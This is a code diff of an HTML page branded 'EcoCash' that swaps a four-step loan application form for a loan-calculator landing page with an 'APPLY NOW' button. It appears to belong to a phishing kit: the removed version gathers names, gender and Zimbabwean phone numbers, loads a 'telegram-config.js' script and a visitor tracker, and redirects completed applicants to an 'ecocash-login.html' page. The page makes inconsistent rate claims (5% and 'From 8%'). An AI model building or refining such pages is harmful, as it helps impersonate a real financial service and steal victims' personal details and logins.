@@ -1,298 +1,302 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>EcoCash - Loan Application</title>
-  <link rel="stylesheet" href="styles.css">
-</head>
-<body>
-  <div class="wrap">
-    <div class="logo">
-      <span>Eco</span><span>Cash</span>
-    </div>
-    <!-- Progress Bar -->
-    <div class="prog-bar">
-      <div class="prog-step">
-        <div class="prog-circle active" id="pc1">1</div>
-        <div class="prog-label active">Loan</div>
-      </div>
-      <div class="prog-line" id="pline1"></div>
-      <div class="prog-step">
-        <div class="prog-circle" id="pc2">2</div>
-        <div class="prog-label">Details</div>
-      </div>
-      <div class="prog-line" id="pline2"></div>
-      <div class="prog-step">
-        <div class="prog-circle" id="pc3">3</div>
-        <div class="prog-label">Personal</div>
-      </div>
-      <div class="prog-line" id="pline3"></div>
-      <div class="prog-step">
-        <div class="prog-circle" id="pc4">4</div>
-        <div class="prog-label">Review</div>
-      </div>
-    </div>
-
-    <!-- Step 1: Loan Calculator -->
-    <div class="step active" id="step1">
-      <div class="card">
-        <h1 class="card-title">Get Your Loan Quote</h1>
-        <p class="card-desc">Adjust the sliders to see your personalized loan terms</p>
-
-        <div class="calc-section">
-          <div class="calc-row">
-            <label class="calc-label">Loan Amount</label>
-            <div class="calc-value" id="lblAmount">$200</div>
-          </div>
-          <input type="range" id="slAmount" min="50" max="10000" step="50" value="200" class="calc-slider">
-
-          <div class="calc-row">
-            <label class="calc-label">Loan Term</label>
-            <div class="calc-value" id="lblTerm">12 months</div>
-          </div>
-          <input type="range" id="slTerm" min="3" max="36" step="1" value="12" class="calc-slider">
-
-          <div class="calc-summary">
-            <div class="calc-item">
-              <span class="calc-item-label">Monthly Repayment</span>
-              <span class="calc-item-value" id="lblRepay">$172.48</span>
-            </div>
-            <div class="calc-item">
-              <span class="calc-item-label">Total Repayable</span>
-              <span class="calc-item-value" id="lblTotal">$2,069.76</span>
-            </div>
-          </div>
-
-          <div class="rate-disclosure">
-            <span class="rate-icon">ℹ️</span>
-            <span>Annual Interest Rate: <strong>5.00%</strong> (fixed). Rates may vary based on creditworthiness and loan type.</span>
-          </div>
-        </div>
-
-        <button class="btn-primary" onclick="goTo(2)">Continue</button>
-      </div>
-    </div>
-
-    <!-- Step 2: Loan Details -->
-    <div class="step" id="step2">
-      <div class="card">
-        <h1 class="card-title">Loan Details</h1>
-        <p class="card-desc">Tell us more about your loan needs</p>
-
-        <div class="preview-card">
-          <div class="preview-row">
-            <span class="preview-label">Loan Amount:</span>
-            <span class="preview-value" id="pf_amount">$2,000</span>
-          </div>
-          <div class="preview-row">
-            <span class="preview-label">Loan Term:</span>
-            <span class="preview-value" id="pf_term">12 months</span>
-          </div>
-        </div>
-
-        <div class="form-group">
-          <label class="form-label">Loan Type</label>
-          <div class="loan-type-grid">
-            <button class="loan-type-btn" onclick="selectType(this, 'Personal')">Personal Loan</button>
-            <button class="loan-type-btn" onclick="selectType(this, 'Business')">Business Loan</button>
-            <button class="loan-type-btn" onclick="selectType(this, 'Education')">Education Loan</button>
-            <button class="loan-type-btn" onclick="selectType(this, 'Emergency')">Emergency Loan</button>
-          </div>
-          <div class="error-msg" id="err_type">Please select a loan type</div>
-        </div>
-
-        <div class="form-group">
-          <label class="form-label" for="loanPurpose">Loan Purpose</label>
-          <textarea id="loanPurpose" class="form-textarea" placeholder="Describe why you need this loan..." rows="3"></textarea>
-          <div class="error-msg" id="err_purpose">Please describe your loan purpose</div>
-        </div>
-
-        <div class="btn-row">
-          <button class="btn-secondary" onclick="goTo(1)">Back</button>
-          <button class="btn-primary" onclick="validateStep2()">Continue</button>
-        </div>
-      </div>
-    </div>
-
-    <!-- Step 3: Personal Information & Identity -->
-    <div class="step" id="step3">
-      <div class="card">
-        <h1 class="card-title">Personal Information</h1>
-        <p class="card-desc">We need your details to process your application</p>
-
-        <div class="form-group">
-          <label class="form-label" for="firstName">First Name</label>
-          <input type="text" id="firstName" class="form-input" placeholder="Enter your first name">
-          <div class="error-msg" id="err_fn">First name is required</div>
-        </div>
-
-        <div class="form-group">
-          <label class="form-label" for="lastName">Last Name</label>
-          <input type="text" id="lastName" class="form-input" placeholder="Enter your last name">
-          <div class="error-msg" id="err_ln">Last name is required</div>
-        </div>
-
-        <div class="form-group">
-          <label class="form-label" for="gender">Gender</label>
-          <select id="gender" class="form-input">
-            <option value="">Select gender</option>
-            <option value="Male">Male</option>
-            <option value="Female">Female</option>
-          </select>
-          <div class="error-msg" id="err_gender">Please select your gender</div>
-        </div>
-
-        <div class="form-group">
-          <label class="form-label" for="phoneNum">Phone Number</label>
-          <input type="tel" id="phoneNum" class="form-input" placeholder="+263712345678" value="+263">
-          <div class="error-msg" id="err_ph">Please enter a valid Zimbabwe phone number</div>
-        </div>
-
-        <div class="btn-row">
-          <button class="btn-secondary" onclick="goTo(2)">Back</button>
-          <button class="btn-primary" onclick="validateStep3()">Continue</button>
-        </div>
-      </div>
-    </div>
-
-    <!-- Step 4: Review & Submit -->
-    <div class="step" id="step4">
-      <div class="card">
-        <h1 class="card-title">Review Your Application</h1>
-        <p class="card-desc">Please review your details before submitting</p>
-
-        <div class="summary-section">
-          <h3 class="summary-title">Loan Summary</h3>
-          <div class="summary-grid">
-            <div class="summary-item">
-              <span class="summary-label">Loan Amount:</span>
-              <span class="summary-value" id="s_amount">$2,000</span>
-            </div>
-            <div class="summary-item">
-              <span class="summary-label">Loan Term:</span>
-              <span class="summary-value" id="s_term">12 months</span>
-            </div>
-            <div class="summary-item">
-              <span class="summary-label">Interest Rate:</span>
-              <span class="summary-value">5.00% per annum</span>
-            </div>
-            <div class="summary-item">
-              <span class="summary-label">Monthly Repayment:</span>
-              <span class="summary-value" id="s_repay">$172.48/mo</span>
-            </div>
-            <div class="summary-item">
-              <span class="summary-label">Total Repayable:</span>
-              <span class="summary-value" id="s_total">$2,069.76</span>
-            </div>
-            <div class="summary-item">
-              <span class="summary-label">Total Interest:</span>
-              <span class="summary-value" id="s_interest">$69.76</span>
-            </div>
-            <div class="summary-item">
-              <span class="summary-label">Loan Type:</span>
-              <span class="summary-value" id="s_type">Personal Loan</span>
-            </div>
-            <div class="summary-item">
-              <span class="summary-label">Purpose:</span>
-              <span class="summary-value" id="s_purpose">For personal use</span>
-            </div>
-          </div>
-        </div>
-
-        <!-- Repayment Schedule -->
-        <div class="summary-section">
-          <h3 class="summary-title">Repayment Schedule</h3>
-          <div class="schedule-header">
-            <span>Month</span>
-            <span>Payment</span>
-            <span>Principal</span>
-            <span>Interest</span>
-            <span>Balance</span>
-          </div>
-          <div id="repaymentSchedule" class="schedule-body"></div>
-          <div class="schedule-toggle" id="scheduleToggle" onclick="toggleSchedule()">Show all months ▼</div>
-        </div>
-
-        <div class="summary-section">
-          <h3 class="summary-title">Personal Details</h3>
-          <div class="summary-grid">
-            <div class="summary-item">
-              <span class="summary-label">Full Name:</span>
-              <span class="summary-value" id="s_name">John Doe</span>
-            </div>
-            <div class="summary-item">
-              <span class="summary-label">Gender:</span>
-              <span class="summary-value" id="s_gender"></span>
-            </div>
-            <div class="summary-item">
-              <span class="summary-label">Phone:</span>
-              <span class="summary-value" id="s_phone">+263712345678</span>
-            </div>
-          </div>
-        </div>
-
-        <div class="summary-section">
-        <!-- Terms & Conditions -->
-        <div class="terms-section">
-          <h3 class="summary-title">Terms & Conditions</h3>
-          <div class="terms-box">
-            <p>By submitting this application, you agree to the following:</p>
-            <ul>
-              <li>The annual interest rate is <strong>5.00%</strong> (fixed) applied on a compound basis.</li>
-              <li>Late payments may incur a penalty fee of 2% of the outstanding balance per month.</li>
-              <li>EcoCash reserves the right to decline any application without providing reasons.</li>
-              <li>Your personal and financial information will be used solely for the purpose of processing this loan application and will be handled in accordance with our Privacy Policy.</li>
-              <li>Loan disbursement is subject to verification of the information you have provided.</li>
-              <li>You must be at least 18 years of age and a Zimbabwean citizen or resident to apply.</li>
-            </ul>
-          </div>
-          <label class="terms-check">
-            <input type="checkbox" id="agreeTerms">
-            <span>I have read and agree to the Terms & Conditions and Privacy Policy</span>
-          </label>
-          <div class="error-msg" id="err_terms">You must accept the Terms & Conditions to proceed</div>
-        </div>
-
-        <div class="btn-row">
-          <button class="btn-secondary" onclick="goTo(3)">Back</button>
-          <button class="btn-submit" onclick="submitApp()">Submit Application</button>
-        </div>
-        <div id="submitStatus" class="submit-status" role="status" aria-live="polite"></div>
-        <div class="submit-actions">
-          <button id="retrySubmitBtn" class="btn-secondary retry-btn" type="button" onclick="submitApp()">Retry Submit</button>
-        </div>
-      </div>
-    </div>
-
-  </div>
-
-  <!-- Processing Modal -->
-  <div id="processingModal" class="modal" style="display: none;">
-    <div class="modal-content">
-      <div class="modal-body">
-        <h3>Application is being processed</h3>
-        <p>We will get back to you shortly.</p>
-        <button id="modalDoneBtn" class="btn-primary">Done</button>
-      </div>
-    </div>
-  </div>
-
-  <script src="telegram-config.js"></script>
-  <script src="visitor.js"></script>
-  <script src="script.js"></script>
-  <script>
-    // Check if user has completed loan application (via cookie)
-    (function() {
-      var value = '; ' + document.cookie;
-      var parts = value.split('; loan_completed=');
-      if (parts.length === 2) {
-        var cookieVal = decodeURIComponent(parts.pop().split(';').shift());
-        if (cookieVal === 'true') {
-          window.location.href = 'ecocash-login.html';
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-      }
-    })();
-  </script>
+        
+        html,
+        body {
+            min-height: 100vh;
+            font-family: 'Inter', sans-serif;
+            background: #f0f2f5;
+            overflow-x: hidden;
+            overflow-y: auto;
+        }
+        
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: clamp(10px, 2vw, 20px);
+        }
+        
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: clamp(10px, 3vw, 15px) clamp(15px, 4vw, 20px);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: clamp(5px, 2vw, 10px);
+        }
+        
+        .menu-btn {
+            font-size: clamp(24px, 6vw, 28px);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #333;
+        }
+        
+        .logo {
+            font-size: clamp(24px, 6vw, 28px);
+            font-weight: 700;
+        }
+        
+        .logo-eco {
+            color: #0066ff;
+        }
+        
+        .logo-cash {
+            color: #ff0000;
+        }
+        
+        .card {
+            background: white;
+            border-radius: clamp(16px, 5vw, 24px);
+            padding: clamp(24px, 6vw, 32px) clamp(20px, 5vw, 28px);
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+        
+        @media (min-width: 769px) {
+            body {
+                padding: clamp(15px, 3vw, 20px);
+                justify-content: center;
+            }
+            .card {
+                padding: clamp(30px, 5vw, 40px) clamp(25px, 4vw, 30px);
+            }
+        }
+        
+        .title {
+            font-size: clamp(22px, 5vw, 26px);
+            font-weight: 700;
+            color: #333;
+            margin-bottom: clamp(4px, 1.5vw, 6px);
+        }
+        
+        .subtitle {
+            font-size: clamp(13px, 3.5vw, 15px);
+            color: #777;
+            margin-bottom: clamp(18px, 5vw, 24px);
+        }
+        
+        .calc-section {
+            background: #f8f9ff;
+            border-radius: clamp(15px, 4vw, 20px);
+            padding: clamp(18px, 5vw, 24px);
+            margin-bottom: clamp(18px, 5vw, 24px);
+            text-align: left;
+        }
+        
+        .calc-title {
+            font-size: clamp(16px, 4vw, 19px);
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: clamp(18px, 5vw, 24px);
+            color: #333;
+        }
+        
+        .input-group {
+            margin-bottom: clamp(24px, 7vw, 32px);
+        }
+        
+        .input-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: clamp(8px, 2vw, 10px);
+            font-weight: 600;
+            font-size: clamp(13px, 3.5vw, 15px);
+        }
+        
+        .input-label {
+            color: #333;
+        }
+        
+        .input-value {
+            color: #4361ee;
+            font-weight: 700;
+        }
+        
+        .slider {
+            -webkit-appearance: none;
+            width: 100%;
+            height: 8px;
+            border-radius: 4px;
+            background: #e0e0e0;
+            outline: none;
+        }
+        
+        .slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: clamp(24px, 6vw, 28px);
+            height: clamp(24px, 6vw, 28px);
+            border-radius: 50%;
+            background: #4361ee;
+            cursor: pointer;
+        }
+        
+        .range-labels {
+            display: flex;
+            justify-content: space-between;
+            color: #999;
+            font-size: clamp(12px, 3vw, 14px);
+            margin-top: clamp(6px, 2vw, 8px);
+        }
+        
+        .payment-box {
+            background: #f0f4ff;
+            padding: clamp(14px, 4vw, 18px);
+            border-radius: clamp(12px, 4vw, 16px);
+            text-align: center;
+        }
+        
+        .payment-label {
+            display: block;
+            color: #666;
+            margin-bottom: clamp(6px, 2vw, 8px);
+            font-size: clamp(12px, 3vw, 14px);
+        }
+        
+        .payment-amount {
+            font-size: clamp(26px, 7vw, 30px);
+            font-weight: 700;
+            color: #4361ee;
+        }
+        
+        .apply-btn {
+            width: 100%;
+            padding: clamp(12px, 4vw, 16px);
+            background: linear-gradient(to right, #4361ee, #7209b7);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: clamp(16px, 4vw, 18px);
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: clamp(18px, 5vw, 24px);
+        }
+        
+        .features {
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            gap: clamp(10px, 3vw, 20px);
+        }
+        
+        .feature {
+            text-align: center;
+            color: #777;
+            font-size: clamp(11px, 3vw, 13px);
+            flex: 1 0 100px;
+        }
+        
+        .feature-icon {
+            font-size: clamp(32px, 8vw, 36px);
+            margin-bottom: clamp(6px, 2vw, 8px);
+        }
+        
+        footer {
+            padding: clamp(10px, 3vw, 15px);
+            color: #aaa;
+            font-size: clamp(11px, 3vw, 13px);
+            text-align: center;
+            flex-shrink: 0;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <button class="menu-btn">☰</button>
+        <div class="logo"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div>
+        <div></div>
+    </header>
+    <main class="card">
+        <div>
+            <h1 class="title">Get Your Loan Approved Fast</h1>
+            <p class="subtitle">Quick approval • Competitive rates • Flexible terms</p>
+            <div class="calc-section">
+                <h2 class="calc-title">Loan Calculator</h2>
+                <div class="input-group">
+                    <div class="input-header">
+                        <span class="input-label">Loan Amount</span>
+                        <span class="input-value" id="amountValue">$5,000</span>
+                    </div>
+                    <input type="range" class="slider" min="100" max="5000" value="5000" id="amountSlider">
+                    <div class="range-labels"><span>$100</span><span>$5,000</span></div>
+                </div>
+                <div class="input-group">
+                    <div class="input-header">
+                        <span class="input-label">Loan Term</span>
+                        <span class="input-value" id="termValue">12 months</span>
+                    </div>
+                    <input type="range" class="slider" min="6" max="60" step="6" value="12" id="termSlider">
+                    <div class="range-labels"><span>6 months</span><span>60 months</span></div>
+                </div>
+                <div class="payment-box">
+                    <span class="payment-label">Monthly Payment</span>
+                    <span class="payment-amount" id="paymentAmount">$450.00</span>
+                </div>
+            </div>
+            <button class="apply-btn" id="applyBtn">APPLY NOW</button>
+        </div>
+        <div class="features">
+            <div class="feature">
+                <div class="feature-icon">⚡</div>Fast Approval<br>Within 24 hours</div>
+            <div class="feature">
+                <div class="feature-icon">💰</div>Low Rates<br>From 8%</div>
+            <div class="feature">
+                <div class="feature-icon">🔒</div>Secure<br>Bank-level</div>
+        </div>
+    </main>
+    <footer>© 2025 EcoCash</footer>
+    <script>
+        const amountSlider = document.getElementById('amountSlider');
+        const termSlider = document.getElementById('termSlider');
+        const amountValue = document.getElementById('amountValue');
+        const termValue = document.getElementById('termValue');
+        const paymentAmount = document.getElementById('paymentAmount');
+
+        function updateCalculator() {
+            const amount = parseFloat(amountSlider.value);
+            const months = parseFloat(termSlider.value);
+            amountValue.textContent = '$' + amount.toLocaleString();
+            termValue.textContent = months + (months === 1 ? ' month' : ' months');
+            const annualRate = 0.08;
+            const monthlyRate = annualRate / 12;
+            if (months === 0) {
+                paymentAmount.textContent = '$' + amount.toFixed(2);
+            } else {
+                const power = Math.pow(1 + monthlyRate, months);
+                const monthlyPayment = amount * (monthlyRate * power) / (power - 1);
+                paymentAmount.textContent = '$' + monthlyPayment.toFixed(2);
+            }
+        }
+        updateCalculator();
+        amountSlider.addEventListener('input', updateCalculator);
+        termSlider.addEventListener('input', updateCalculator);
+        document.getElementById('applyBtn').addEventListener('click', function() {
+            localStorage.setItem('loanAmount', amountSlider.value);
+            localStorage.setItem('loanTerm', termSlider.value);
+            window.location.href = 'application.html';
+        });
+    </script>
 </body>
+
 </html>
